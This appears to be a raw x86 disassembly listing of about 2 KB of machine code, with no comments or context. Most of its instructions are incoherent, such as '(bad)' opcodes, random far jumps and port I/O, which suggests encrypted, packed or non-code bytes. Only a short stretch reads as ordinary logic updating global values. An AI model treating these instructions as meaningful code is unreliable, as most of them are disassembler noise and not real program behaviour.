  4117ff:	aaa    
  411800:	xor    bl,dh
  411802:	shl    DWORD PTR [eax-0x1f6a4a6b],0x7f
  411809:	sub    DWORD PTR [ecx+0x63],edx
  41180c:	test   ebx,esi
  41180e:	or     cl,BYTE PTR [edi-0x8bd3fda]
  411814:	xchg   edx,eax
  411815:	lds    eax,FWORD PTR [ecx]
  411817:	jmp    0x657:0xd33b5f9f
  41181e:	fdivr  st(1),st
  411820:	in     eax,0xba
  411822:	xor    esp,DWORD PTR [ebx+0x7e]
  411825:	mov    ch,0x52
  411827:	push   esp
  411828:	cmp    BYTE PTR [ecx+0x69],al
  41182b:	adc    BYTE PTR [edi+0x36],ch
  41182e:	(bad)  
  41182f:	and    al,0x2b
  411831:	ins    BYTE PTR es:[edi],dx
  411832:	shl    DWORD PTR [edi],0x55
  411835:	mul    DWORD PTR [edx-0x7e]
  411838:	cmp    DWORD PTR [eax+0xc758b03],edx
  41183e:	sub    eax,edx
  411840:	add    DWORD PTR ds:0x42fdf5,0x7f3f
  41184a:	xor    eax,ecx
  41184c:	mov    DWORD PTR ds:0x42fe7a,0x5771
  411856:	cmp    eax,esi
  411858:	mov    DWORD PTR ds:0x42fe76,0x752
  411862:	jne    0x411c7d
  411868:	jmp    0x411c6d
  41186d:	js     0x411844
  41186f:	stos   BYTE PTR es:[edi],al
  411870:	loopne 0x4118db
  411872:	jae    0x4118b6
  411874:	cmc    
  411875:	pop    esi
  411876:	sub    BYTE PTR [ecx+0x4419c1e9],dl
  41187c:	fbstp  TBYTE PTR [esi+0x57]
  41187f:	jo     0x4118f1
  411881:	pop    eax
  411882:	jge    0x4118f4
  411884:	jo     0x411823
  411886:	fst    st(7)
  411888:	pop    eax
  411889:	inc    esi
  41188a:	mov    esp,0xfd1d1083
  41188f:	rcl    BYTE PTR [edi],cl
  411891:	or     ebx,ebx
  411893:	mov    bl,0x98
  411895:	rol    BYTE PTR [esi-0x3],0x4d
  411899:	jno    0x4118bf
  41189b:	push   es
  41189c:	ins    BYTE PTR es:[edi],dx
  41189d:	jl     0x411879
  41189f:	mov    ds,WORD PTR [ecx-0x75abbeba]
  4118a5:	scas   eax,DWORD PTR es:[edi]
  4118a6:	and    ah,ah
  4118a8:	mov    al,0x52
  4118aa:	add    DWORD PTR [esi+esi*1],ecx
  4118ad:	inc    esi
  4118ae:	push   cs
  4118af:	sub    al,0x32
  4118b1:	(bad)  
  4118b2:	js     0x4118e4
  4118b4:	mov    ds:0xccfea7c1,eax
  4118b9:	out    dx,al
  4118ba:	aam    0xe3
  4118bc:	aam    0x89
  4118be:	das    
  4118bf:	fsubr  QWORD PTR [esi+esi*8-0x2767ef1a]
  4118c6:	into   
  4118c7:	mov    gs,WORD PTR [edi-0x74e5b49c]
  4118cd:	cmp    dh,0x3
  4118d0:	in     al,0x15
  4118d2:	cdq    
  4118d3:	dec    edx
  4118d4:	mov    dh,0x39
  4118d6:	loopne 0x4118b5
  4118d8:	fwait
  4118d9:	vhaddpd xmm2,xmm1,XMMWORD PTR es:[edi]
  4118de:	cli    
  4118df:	mov    ?,WORD PTR [edi]
  4118e1:	mov    bl,0x28
  4118e3:	or     al,0xce
  4118e5:	ins    BYTE PTR es:[edi],dx
  4118e6:	mov    ds:0xbf40109b,eax
  4118eb:	lds    ecx,FWORD PTR [ebp+0x28]
  4118ee:	and    al,0xe5
  4118f0:	fldenv [edx]
  4118f2:	sub    ebx,DWORD PTR [edx+ebp*8]
  4118f5:	lds    ecx,FWORD PTR [edi-0x34612ffc]
  4118fb:	sahf   
  4118fc:	cld    
  4118fd:	pop    eax
  4118fe:	push   0x4a
  411900:	sti    
  411901:	rcr    DWORD PTR [ebx+0x44e5410e],0xf9
  411908:	fld    st(4)
  41190a:	(bad)  
  41190b:	or     ecx,esi
  41190d:	mov    edi,0x552851bf
  411912:	ficomp WORD PTR [eax+ecx*1]
  411915:	pop    ecx
  411916:	push   esp
  411917:	xchg   DWORD PTR gs:[esi],ecx
  41191a:	or     BYTE PTR [eax+edi*2],0x22
  41191e:	adc    eax,0x8ad066e8
  411923:	push   esp
  411924:	cli    
  411925:	jnp    0x411973
  411927:	out    dx,eax
  411928:	pop    eax
  411929:	fstp   DWORD PTR [ebx+0x387e109]
  41192f:	stos   DWORD PTR es:[edi],eax
  411930:	sbb    ecx,esi
  411932:	pop    esi
  411933:	xor    eax,ecx
  411935:	mov    esi,0xb054ca20
  41193a:	cdq    
  41193b:	xor    al,0xdc
  41193d:	test   al,0x84
  41193f:	scas   eax,DWORD PTR es:[edi]
  411940:	xor    BYTE PTR [ebp+0x17dc006],bh
  411946:	xlat   BYTE PTR ds:[ebx]
  411947:	and    BYTE PTR [edi],al
  411949:	cdq    
  41194a:	shr    DWORD PTR [ebx],0x22
  41194d:	scas   eax,DWORD PTR es:[edi]
  41194e:	lds    edx,FWORD PTR [esp+edx*2-0x5e8b7868]
  411955:	xlat   BYTE PTR ds:[ebx]
  411956:	ss add dl,dl
  411959:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41195a:	enter  0x2d5f,0x20
  41195e:	retf   
  41195f:	jmp    0x4119a8
  411961:	out    dx,eax
  411962:	dec    eax
  411963:	out    0xce,al
  411965:	sub    esp,DWORD PTR [eax+0x68]
  411968:	mov    DWORD PTR [esi-0x6b],0x1ce715fb
  41196f:	sub    ah,BYTE PTR [edi+esi*2+0x47]
  411973:	jp     0x411959
  411975:	pusha  
  411976:	popf   
  411977:	ds jmp 0x411926
  41197a:	test   DWORD PTR [ecx-0x74],ebx
  41197d:	scas   al,BYTE PTR es:[edi]
  41197e:	jb     0x41197f
  411980:	sbb    BYTE PTR [ebp-0x6],al
  411983:	stos   DWORD PTR es:[edi],eax
  411984:	cli    
  411985:	rcl    DWORD PTR [eax+0x5e722000],1
  41198b:	mov    ss,WORD PTR [eax+0x34]
  41198e:	inc    ebp
  41198f:	cmp    DWORD PTR [ebx+0x617d0763],ebx
  411995:	add    ebp,DWORD PTR [edx+0x5c3d1e4a]
  41199b:	dec    ebp
  41199c:	xor    al,0xc3
  41199e:	ficom  DWORD PTR [bp+0x2214]
  4119a3:	loop   0x411925
  4119a5:	fsub   QWORD PTR [edx-0x2ad68e2]
  4119ab:	jecxz  0x411a15
  4119ad:	inc    edx
  4119ae:	outs   dx,BYTE PTR cs:[esi]
  4119b0:	out    dx,eax
  4119b1:	push   0x5
  4119b3:	cmp    BYTE PTR [ebp-0x73],ch
  4119b6:	loope  0x411969
  4119b8:	pop    esi
  4119b9:	rol    DWORD PTR [esi],0x4e
  4119bc:	out    dx,eax
  4119bd:	in     al,0x7f
  4119bf:	sahf   
  4119c0:	retf   0xca77
  4119c3:	jo     0x411a0f
  4119c5:	call   0x5ecd:0x67dc55bc
  4119cc:	ss (bad) 
  4119ce:	loope  0x411981
  4119d0:	shr    DWORD PTR [esi-0x3b1fb731],0x19
  4119d7:	outs   dx,DWORD PTR ds:[esi]
  4119d8:	xlat   BYTE PTR ds:[ebx]
  4119d9:	pop    ecx
  4119da:	dec    edi
  4119db:	jle    0x411a12
  4119dd:	xchg   BYTE PTR [edi+edx*2-0x23beeaeb],cl
  4119e4:	test   BYTE PTR [ebp-0x79],bh
  4119e7:	hlt    
  4119e8:	cs fs sub al,0x55
  4119ec:	push   eax
  4119ed:	(bad)  
  4119ee:	repnz add DWORD PTR [eax-0x44],edx
  4119f2:	(bad)  [esi]
  4119f4:	sbb    ah,BYTE PTR [edi+ebp*8-0x6de910f8]
  4119fb:	and    BYTE PTR [ebx-0x1579d292],0x37
  411a02:	cmp    al,0xa2
  411a04:	in     al,dx
  411a05:	add    eax,ebx
  411a07:	push   ebp
  411a08:	icebp  
  411a09:	adc    ebp,DWORD PTR [edx-0x8]
  411a0c:	nop
  411a0d:	cmc    
  411a0e:	popf   
  411a0f:	push   edx
  411a10:	(bad)  [esi]
  411a12:	test   eax,0x9b5fafa4
  411a17:	mov    esp,0xe527d70e
  411a1c:	mov    WORD PTR [ebp+0x4c5272ad],?
  411a22:	cwde   
  411a23:	ins    BYTE PTR es:[edi],dx
  411a24:	inc    ebx
  411a25:	jmp    0x411a91
  411a27:	pop    ebp
  411a28:	test   eax,0x109f9c16
  411a2d:	scas   al,BYTE PTR es:[edi]
  411a2e:	lods   al,BYTE PTR ds:[esi]
  411a2f:	or     eax,0xb2cab90a
  411a34:	push   edx
  411a35:	jl     0x411a23
  411a37:	loope  0x411a0f
  411a39:	jg     0x411a1b
  411a3b:	sbb    ecx,esp
  411a3d:	das    
  411a3e:	call   0x6f140792
  411a43:	cs jne 0x411a1b
  411a46:	jo     0x411a44
  411a48:	out    dx,eax
  411a49:	loope  0x411a9b
  411a4b:	mov    edi,0x61316c6d
  411a50:	(bad)  
  411a51:	push   esi
  411a52:	sbb    DWORD PTR [eax+0x707c1aef],ebx
  411a58:	push   ss
  411a59:	jmp    0x89317270
  411a5e:	push   esp
  411a5f:	mov    eax,ds:0x113687a1
  411a64:	dec    edi
  411a65:	xchg   dl,cl
  411a67:	dec    ebx
  411a68:	push   edx
  411a69:	test   DWORD PTR [esi-0x72e89e13],esi
  411a6f:	mov    ah,0x24
  411a71:	cmp    DWORD PTR [edi-0x672bc5c],0xffffff86
  411a78:	fnstenv [edx+eax*8-0x3d]
  411a7c:	les    esp,FWORD PTR [ebp+0x722ba6c5]
  411a82:	(bad)  
  411a83:	jmp    0xe28d:0xf61f4128
  411a8a:	mov    al,ds:0x311cf4a6
  411a8f:	cmc    
  411a90:	hlt    
  411a91:	xor    ah,ah
  411a93:	aaa    
  411a94:	lahf   
  411a95:	push   esp
  411a96:	pop    ebx
  411a97:	rcl    ah,0xef
  411a9a:	mov    fs,WORD PTR [eax]
  411a9c:	ficomp DWORD PTR [eax-0x33]
  411a9f:	jg     0x411ab8
  411aa1:	stos   DWORD PTR es:[edi],eax
  411aa2:	call   0x27a1:0xb20485c0
  411aa9:	or     al,0x86
  411aab:	ins    DWORD PTR es:[edi],dx
  411aac:	aad    0xd4
  411aae:	loope  0x411b2d
  411ab0:	(bad)  
  411ab1:	repz push esp
  411ab3:	rcr    BYTE PTR [ebx],1
  411ab5:	out    dx,eax
  411ab6:	fdivr  QWORD PTR [edx]
  411ab8:	(bad)  
  411ab9:	outs   dx,BYTE PTR ds:[esi]
  411aba:	sub    ebx,DWORD PTR [edi]
  411abc:	aad    0xe0
  411abe:	add    DWORD PTR [edx],edi
  411ac0:	rcl    BYTE PTR [esi-0x127e2694],1
  411ac6:	outs   dx,DWORD PTR ds:[esi]
  411ac7:	mov    edx,DWORD PTR [esi+edi*2+0x68]
  411acb:	sub    BYTE PTR [ebp-0x7dccc883],cl
  411ad1:	push   ebx
  411ad2:	out    dx,al
  411ad3:	test   DWORD PTR [ecx],edi
  411ad5:	adc    BYTE PTR [eax],bl
  411ad7:	pop    ds
  411ad8:	call   0x24037d26
  411add:	xchg   edi,eax
  411ade:	push   edi
  411adf:	clc    
  411ae0:	int    0x84
  411ae2:	aad    0x8f
  411ae4:	nop
  411ae5:	mov    eax,ds:0x8f292295
  411aea:	out    dx,al
  411aeb:	enter  0xc238,0xe5
  411aef:	mov    al,ds:0xbb2085fd
  411af4:	or     DWORD PTR [edi+0x15],esp
  411af7:	xor    BYTE PTR [ecx+0x6],bh
  411afa:	das    
  411afb:	push   edi
  411afc:	and    BYTE PTR [esi+0x99ef7cb],dl
  411b02:	inc    esp
  411b03:	fist   DWORD PTR [edx+0x47371a84]
  411b09:	mov    bl,0x44
  411b0b:	pop    ebp
  411b0c:	int    0x13
  411b0e:	xchg   edx,eax
  411b0f:	or     al,0x53
  411b11:	lock mov dh,cl
  411b14:	clc    
  411b15:	out    0x8e,al
  411b17:	inc    eax
  411b18:	xor    BYTE PTR [ebx-0x7f30777],bh
  411b1e:	aas    
  411b1f:	ins    BYTE PTR es:[edi],dx
  411b20:	and    BYTE PTR [eax-0x56],ah
  411b23:	sub    DWORD PTR [eax+0x31],edi
  411b26:	mov    bl,0x1
  411b28:	inc    esi
  411b29:	(bad)  
  411b2a:	int3   
  411b2b:	xor    edx,DWORD PTR es:[ebx-0x57]
  411b2f:	mov    bh,0x91
  411b31:	xor    esi,edx
  411b33:	push   edi
  411b34:	loope  0x411af2
  411b36:	fcom   DWORD PTR [eax-0x30]
  411b39:	loop   0x411ac4
  411b3b:	int    0x2d
  411b3d:	jmp    0x411b22
  411b3f:	sti    
  411b40:	xchg   ebx,eax
  411b41:	ror    BYTE PTR [edx+0x3791b649],cl
  411b47:	jp     0x411b66
  411b49:	data16 sub al,0x5a
  411b4c:	inc    ebx
  411b4d:	adc    esp,ebp
  411b4f:	xchg   ecx,eax
  411b50:	test   BYTE PTR [edx+edi*2+0x3602bb98],0x7e
  411b58:	push   ecx
  411b59:	fld    DWORD PTR [ebx+0x10]
  411b5c:	sbb    bh,BYTE PTR [edx]
  411b5e:	cmp    BYTE PTR [eax],ch
  411b60:	dec    esi
  411b61:	xor    eax,0xe77ae3e6
  411b66:	push   ss
  411b67:	push   edi
  411b68:	inc    esp
  411b69:	inc    ebp
  411b6a:	mov    ebx,0xea414690
  411b6f:	pop    ebx
  411b70:	pop    ecx
  411b71:	out    0xb,eax
  411b73:	je     0x411b9e
  411b75:	sub    BYTE PTR [edx],bh
  411b77:	pop    ds
  411b78:	pslld  mm3,QWORD PTR [ebp-0x4d]
  411b7c:	and    dh,BYTE PTR [ecx]
  411b7e:	mov    DWORD PTR [edx+0x9],edi
  411b81:	fdiv   DWORD PTR [edi]
  411b83:	pop    ebp
  411b84:	xor    BYTE PTR fs:[ecx],dh
  411b87:	ss lahf 
  411b89:	call   0x2e56fdd3
  411b8e:	lea    esp,[ecx]
  411b90:	sub    al,0xb5
  411b92:	sbb    edi,ebp
  411b94:	inc    edi
  411b95:	inc    ecx
  411b96:	inc    esp
  411b97:	add    BYTE PTR [eax+ebx*8+0x126e2b5e],dl
  411b9e:	cmp    al,0xc1
  411ba1:	rcr    DWORD PTR [edx+eax*4-0x62],0x92
  411ba6:	dec    edx
  411ba7:	xchg   esi,eax
  411ba8:	imul   esi,ecx,0x2e52c485
  411bae:	xlat   BYTE PTR ds:[ebx]
  411baf:	and    DWORD PTR [ebx-0x57ab8f4a],edx
  411bb5:	repz mov edx,0xe8c0a384
  411bbb:	sbb    BYTE PTR [eax-0x7d],ah
  411bbe:	repnz push 0x53
  411bc1:	dec    edx
  411bc2:	pushf  
  411bc3:	dec    eax
  411bc4:	and    al,0xb3
  411bc6:	mov    al,BYTE PTR [esi]
  411bc8:	cwde   
  411bc9:	sahf   
  411bca:	and    al,0x9d
  411bcc:	popa   
  411bcd:	xchg   ebp,eax
  411bce:	cdq    
  411bcf:	mov    edx,0xf03bb3ea
  411bd4:	stos   BYTE PTR es:[edi],al
  411bd5:	scas   eax,DWORD PTR es:[edi]
  411bd6:	push   ebp
  411bd7:	jle    0x411b8e
  411bd9:	mov    esp,0xcef053ab
  411bde:	ins    DWORD PTR es:[edi],dx
  411bdf:	outs   dx,DWORD PTR ds:[esi]
  411be0:	add    esp,ebx
  411be2:	jl     0x411c1f
  411be4:	lahf   
  411be5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411be6:	add    DWORD PTR [eax-0x52],esi
  411be9:	push   ebp
  411bea:	loopne 0x411b81
  411bec:	or     DWORD PTR [esi-0x72],edx
  411bef:	xlat   BYTE PTR ds:[ebx]
  411bf0:	test   BYTE PTR [ecx-0x73],0x5c
  411bf4:	xor    al,BYTE PTR es:[ebp+0x6d]
  411bf8:	dec    esi
  411bf9:	jmp    0x411b7b
  411bfb:	push   ds
  411bfc:	jo     0x411bcb
  411bfe:	fcomp  DWORD PTR [ebx]
  411c00:	inc    eax
  411c01:	loop   0x411c4e
  411c03:	jp     0x411bab
  411c05:	icebp  
  411c06:	pop    edi
  411c07:	add    BYTE PTR [edi+0x73],ah
  411c0a:	fsubr  DWORD PTR [ebx]
  411c0c:	lahf   
  411c0d:	xchg   edi,eax
  411c0e:	fcmovnb st,st(2)
  411c10:	popf   
  411c11:	in     al,0xd0
  411c13:	cmp    DWORD PTR [esi-0x3b],esp
  411c16:	mov    ds:0xa97180f3,al
  411c1b:	or     BYTE PTR gs:[eax-0x54],dh
  411c1f:	adc    ah,BYTE PTR [esi-0x3f]
  411c22:	lock or bh,BYTE PTR [esi]
  411c25:	movups XMMWORD PTR [eax],xmm1
  411c28:	add    al,0x74
  411c2a:	xchg   ebx,eax
  411c2b:	mov    esi,0x79ac4897
  411c30:	mov    bh,0x66
  411c32:	in     eax,0xe6
  411c34:	call   0xe80a3175
  411c39:	outs   dx,DWORD PTR ds:[esi]
  411c3a:	ins    DWORD PTR es:[edi],dx
  411c3b:	push   esi
  411c3c:	dec    edi
  411c3d:	cdq    
  411c3e:	gs sbb al,0xb9
  411c41:	inc    edx
  411c42:	push   0xfffffff5
  411c44:	aaa    
  411c45:	mov    ebx,0xf176373f
  411c4a:	shl    ebp,0xd7
  411c4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c4e:	or     ecx,DWORD PTR [ebx]
  411c50:	add    ebp,DWORD PTR [edx-0x20]
  411c53:	jb     0x411c24
  411c55:	or     ebp,DWORD PTR [eax]
  411c57:	jl     0x411bf5
  411c59:	or     eax,0x929dd776
  411c5e:	cmp    DWORD PTR [edx+0x7b0d76e6],edi
  411c64:	xchg   DWORD PTR [edi],edi
  411c66:	sub    BYTE PTR [edx+0x42],dl
  411c69:	stc    
  411c6a:	js     0x411c51
  411c6c:	inc    esp
  411c6d:	mov    eax,ds:0x41b22c
  411c72:	add    eax,DWORD PTR ds:0x41b224
  411c78:	jmp    0x411c84
  411c7d:	mov    eax,DWORD PTR [ebp+0xc]
  411c80:	xor    eax,ecx
  411c82:	add    eax,edx
  411c84:	mov    ds:0x41b224,eax
  411c89:	mov    eax,DWORD PTR [ebp+0xc]
  411c8c:	xor    eax,ecx
  411c8e:	add    eax,edx
  411c90:	mov    ds:0x41b22c,eax
  411c95:	jmp    0x4120a9
  411c9a:	mov    eax,ds:0x41b22c
  411c9f:	mov    ds:0x41b224,eax
  411ca4:	jmp    0x4120a9
  411ca9:	mov    dh,0x72
  411cab:	cwde   
  411cac:	test   al,0x64
  411cae:	jb     0x411c66
  411cb0:	jb     0x411ca3
  411cb2:	xchg   ecx,eax
  411cb3:	adc    eax,0xee2b965e
  411cb8:	sbb    al,0x5e
  411cba:	push   ebx
  411cbb:	jo     0x411d2d
  411cbd:	pop    eax
  411cbe:	jge    0x411d30
  411cc0:	jo     0x411ca4
  411cc2:	imul   ecx,eax,0x5cd5ed68
  411cc8:	in     al,dx
  411cc9:	mov    ds:0x378fc5b4,eax
  411cce:	add    eax,0x7c34d028
  411cd3:	or     ebx,DWORD PTR [esi]
  411cd5:	nop
  411cd6:	add    edx,DWORD PTR [edx+eiz*8+0x2c]
  411cda:	sub    cl,BYTE PTR [ebx+0x35]
  411cdd:	adc    dh,BYTE PTR [eax-0x9]
  411ce0:	ins    BYTE PTR es:[edi],dx
  411ce1:	lock in al,0x54
  411ce4:	jno    0x411d3c
  411ce6:	cmp    eax,0x31a982fc
  411ceb:	gs stos BYTE PTR es:[edi],al
  411ced:	xchg   esp,eax
  411cee:	xchg   esi,eax
  411cef:	cmp    cl,BYTE PTR [ecx+0x4b]
  411cf2:	sub    dh,BYTE PTR [ebx]
  411cf4:	call   0x146ad64e
  411cf9:	adc    ecx,DWORD PTR [esp+esi*8]
  411cfc:	inc    DWORD PTR [esi-0x6]
  411cff:	pop    eax
  411d00:	mov    ah,0x81
  411d02:	stos   BYTE PTR es:[edi],al
  411d03:	pop    ds
  411d04:	mov    ?,edi
  411d06:	ret    
  411d07:	or     BYTE PTR [edi-0x11c01b30],dl
  411d0d:	daa    
  411d0e:	cmp    eax,0x6864b19b
  411d13:	nop
  411d14:	(bad)  
  411d16:	push   esp
  411d17:	cs sahf 
  411d19:	out    0xa9,eax
  411d1b:	sub    BYTE PTR [edx],cl
  411d1d:	xor    al,BYTE PTR [eax+eiz*2-0x2f]
  411d21:	xchg   edx,eax
  411d22:	in     al,0xb1
  411d24:	imul   edi,DWORD PTR [edi-0x6e6a6ffe],0xffffffec
  411d2b:	ror    bh,1
  411d2d:	bound  ebx,QWORD PTR [ecx+0x1b]
  411d30:	sahf   
  411d31:	out    dx,eax
  411d32:	push   cs
  411d33:	cmp    BYTE PTR [eax],bh
  411d35:	pop    ss
  411d36:	push   ecx
  411d37:	mov    esp,0x87e93eff
  411d3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d3d:	push   cs
  411d3e:	shl    BYTE PTR [ebp+esi*1-0x54],cl
  411d42:	xchg   esp,eax
  411d43:	or     dh,BYTE PTR [esi-0x32]
  411d46:	cmp    DWORD PTR [esi-0x3e2b337],eax
  411d4c:	or     BYTE PTR [ecx+0x7932a426],dl
  411d52:	sbb    dh,BYTE PTR ds:0x71b9658d
  411d58:	cmp    bh,bh
  411d5a:	out    dx,al
  411d5b:	push   edi
  411d5c:	jne    0x411d15
  411d5e:	xchg   DWORD PTR [eax-0x6e],edx
  411d61:	in     eax,0xa5
  411d63:	sub    DWORD PTR [ecx+0x47ea2dc8],edi
  411d69:	or     eax,0x587a6abe
  411d6e:	bound  edi,QWORD PTR [ebx-0xb]
  411d71:	push   ebp
  411d72:	xor    bh,bh
  411d74:	imul   edi,DWORD PTR [ebp+0x63],0xffffffed
  411d78:	jns    0x411d35
  411d7a:	test   al,0xba
  411d7c:	push   eax
  411d7d:	mov    ecx,0x76331449
  411d82:	xchg   esi,eax
  411d83:	mov    dh,0xf
  411d85:	cmc    
  411d86:	test   DWORD PTR [ebx],ebx
  411d88:	cld    
  411d89:	popa   
  411d8a:	test   eax,0x5e308a1e
  411d8f:	aas    
  411d90:	mov    bl,0x4d
  411d92:	(bad)  
  411d93:	mov    bl,0xac
  411d95:	aad    0x4b
  411d97:	out    0x2f,al
  411d99:	lods   eax,DWORD PTR ss:[esi]
  411d9b:	jne    0x411d24
  411d9d:	stc    
  411d9e:	jl     0x411d89
  411da0:	adc    BYTE PTR [edi-0x7b73ab71],ah
  411da6:	call   0xf26a:0x9c5dce29
  411dad:	sbb    DWORD PTR [edi-0x42],ebx
  411db0:	lods   al,BYTE PTR ds:[esi]
  411db1:	shr    BYTE PTR ds:0x634f7ed4,cl
  411db7:	lock cs iret 
  411dba:	dec    edi
  411dbb:	add    bh,BYTE PTR [ebp-0x5f]
  411dbe:	je     0x411d68
  411dc0:	xchg   edx,esp
  411dc2:	call   0x5689:0xedaf2439
  411dc9:	pop    ss
  411dca:	xor    cl,BYTE PTR [edi]
  411dcc:	pop    esi
  411dcd:	popa   
  411dce:	dec    esp
  411dcf:	cmp    ah,dl
  411dd1:	leave  
  411dd2:	gs jnp 0x411d7d
  411dd5:	xor    DWORD PTR [ebp+0x56],eax
  411dd8:	mov    al,0x70
  411dda:	adc    BYTE PTR [edx],ah
  411ddc:	pop    ss
  411ddd:	add    BYTE PTR [edi+0x5017053b],0xc7
  411de4:	(bad)  
  411de5:	jns    0x411d78
  411de7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411de8:	(bad)  
  411de9:	iret   
  411dea:	jmp    0x411e2f
  411dec:	pusha  
  411ded:	lea    esp,[edi-0x5b9356]
  411df3:	push   es
  411df4:	mov    bl,0x18
  411df6:	add    edx,esp
  411df8:	mov    ds:0x4dd75665,al
  411dfd:	js     0x411df4
  411dff:	mov    cl,0xe4
  411e01:	sbb    eax,0x3d5dd493
  411e06:	sbb    BYTE PTR [eax-0x78530cef],cl
  411e0c:	add    BYTE PTR [edi-0x49],ch
  411e0f:	out    0x74,eax
  411e11:	cmp    cl,BYTE PTR [esi+0x37ec1829]
  411e17:	pop    ds
  411e18:	pop    edx
  411e19:	mov    al,ds:0x29691350
  411e1e:	jmp    0x7ef8:0xffc6a081
  411e25:	stos   DWORD PTR es:[edi],eax
  411e26:	xchg   ecx,eax
  411e27:	daa    
  411e28:	adc    DWORD PTR [edx-0x17269a16],edx
  411e2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e2f:	mov    edx,0x10e5f7e3
  411e34:	jne    0x411e75
  411e36:	push   esi
  411e37:	jnp    0x411de9
  411e39:	addr16 mov dl,0x73
  411e3c:	popa   
  411e3d:	out    0x66,al
  411e3f:	and    ebp,DWORD PTR [ebx]
  411e41:	inc    esp
  411e42:	mov    DWORD PTR [ebx+0xf574f39],edi
  411e48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e49:	pop    esp
  411e4a:	(bad)  
  411e4c:	in     al,0xac
  411e4e:	ret    
  411e4f:	test   al,0x77
  411e51:	sbb    bl,BYTE PTR [eax-0x3]
  411e54:	add    BYTE PTR [edx],bl
  411e56:	les    esp,FWORD PTR [ebx+ebp*4+0xa274dbe]
  411e5d:	(bad)  
  411e5e:	mov    al,0xe
  411e60:	push   ebx
  411e61:	adc    DWORD PTR [edx+0x4ed7f3bd],ebx
  411e67:	shl    cl,0xc2
  411e6a:	mov    bh,0xd8
  411e6c:	xchg   edx,eax
  411e6d:	scas   eax,DWORD PTR es:[edi]
  411e6e:	clc    
  411e6f:	in     al,dx
  411e70:	pop    edi
  411e71:	jle    0x411e41
  411e73:	push   ebx
  411e74:	popa   
  411e75:	test   DWORD PTR gs:[ebx],ebp
  411e78:	dec    esi
  411e79:	jne    0x411e0a
  411e7b:	shl    DWORD PTR [ecx+0xb],cl
  411e7e:	push   0x5a221e33
  411e83:	nop
  411e84:	adc    al,0x13
  411e86:	arpl   WORD PTR [ebx-0x2d],cx
  411e89:	xchg   edx,eax
  411e8a:	out    0xb,eax
  411e8c:	jl     0x411ee9
  411e8e:	lds    ecx,FWORD PTR [edi+0x6541e447]
  411e94:	(bad)  
  411e95:	aad    0x10
  411e97:	mul    al
  411e99:	ret    0x6749
  411e9c:	or     cl,bh
  411e9e:	into   
  411e9f:	scas   al,BYTE PTR es:[edi]
  411ea0:	call   FWORD PTR [edi+0x70]
  411ea3:	or     eax,0x290f74e8
  411ea8:	rol    DWORD PTR ds:0x78eaa13a,0xce
  411eaf:	push   0x54f81e45
  411eb4:	ins    DWORD PTR es:[edi],dx
  411eb5:	pop    ds
  411eb6:	mov    cl,0x42
  411eb8:	sub    DWORD PTR [edi+ebp*8],ebx
  411ebb:	xchg   BYTE PTR [eax],dh
  411ebd:	not    BYTE PTR [esi+0x6d6417f2]
  411ec3:	or     al,0x81
  411ec5:	(bad)  
  411ec6:	adc    dl,BYTE PTR [esp+edx*8]
  411ec9:	adc    BYTE PTR [edx],al
  411ecb:	(bad)  
  411ecc:	mov    esi,0xab3475d9
  411ed1:	in     al,0x5c
  411ed3:	fild   DWORD PTR [eax-0x5fbe91ed]
  411ed9:	push   eax
  411eda:	push   ss
  411edb:	inc    ebx
  411edc:	jg     0x411e9a
  411ede:	inc    BYTE PTR [ecx-0x4f]
  411ee1:	loop   0x411f59
  411ee3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ee4:	sbb    DWORD PTR [esi-0x6c86a2a3],eax
  411eea:	jle    0x411f25
  411eec:	inc    ebx
  411eed:	mov    esp,0xcf1a6460
  411ef2:	test   dh,al
  411ef4:	dec    edx
  411ef5:	xor    dh,BYTE PTR [ebx]
  411ef7:	rol    DWORD PTR [edx-0x6a],0x43
  411efb:	fisttp DWORD PTR ds:0x2c0bce16
  411f01:	inc    edx
  411f02:	add    cl,BYTE PTR [edx+0x46dd1616]
  411f08:	sti    
  411f09:	retf   0x8d5e
  411f0c:	pushf  
  411f0d:	adc    dh,BYTE PTR [esi+eax*1-0x77889091]
  411f14:	push   ds
  411f15:	push   cs
  411f16:	(bad)  
  411f17:	mov    ah,ch
  411f19:	repz push es
  411f1b:	in     al,0xf7
  411f1d:	jb     0x411f6a
  411f1f:	lahf   
  411f20:	and    al,0x3
  411f22:	xor    esi,eax
  411f24:	cmp    dl,BYTE PTR [eax+ecx*4+0x62]
  411f28:	and    ecx,DWORD PTR [edi-0x2e98113d]
  411f2e:	sbb    eax,0x2501a3fa
  411f33:	mov    ds,esi
  411f35:	iret   
  411f36:	sbb    ebx,DWORD PTR [edi]
  411f38:	or     BYTE PTR [ebp+ecx*4+0x627741a5],bh
  411f3f:	imul   ebp,DWORD PTR [ecx],0xffffff84
  411f42:	loope  0x411f71
  411f44:	mov    ecx,0xdb3d369d
  411f49:	loope  0x411f37
  411f4b:	in     eax,dx
  411f4c:	fsubr  st(6),st
  411f4e:	jmp    0x411f02
  411f50:	les    eax,FWORD PTR [edx+eiz*1+0x23]
  411f54:	mov    ebx,DWORD PTR [ebp+0x544b3b7e]
  411f5a:	pushf  
  411f5b:	mov    bh,BYTE PTR es:[eax-0x62]
  411f5f:	push   ebx
  411f60:	dec    esp
  411f61:	mov    edx,0x33d3160b
  411f66:	out    0xd9,al
  411f68:	sbb    al,0x94
  411f6a:	inc    esi
  411f6b:	mov    ecx,fs
  411f6d:	test   eax,0x7286be11
  411f72:	mov    ebp,DWORD PTR [ebx+0x566d93ac]
  411f78:	lock or BYTE PTR [eax],ch
  411f7b:	pop    ebx
  411f7c:	(bad)  
  411f7e:	call   0x5c8e1458
  411f83:	dec    edx
  411f84:	outs   dx,BYTE PTR ss:[esi]
  411f86:	jb     0x411f91
  411f88:	cli    
  411f89:	or     BYTE PTR [eax],0xf7
  411f8c:	into   
  411f8d:	mov    ds:0xab9d24c3,eax
  411f92:	xor    BYTE PTR [edx],bh
  411f94:	iret   
  411f95:	imul   edi,DWORD PTR [edi+0x5a2dee03],0xffffffd6
  411f9c:	das    
  411f9d:	out    dx,al
  411f9e:	in     eax,dx
  411f9f:	or     DWORD PTR [ecx],esp
  411fa1:	push   edi
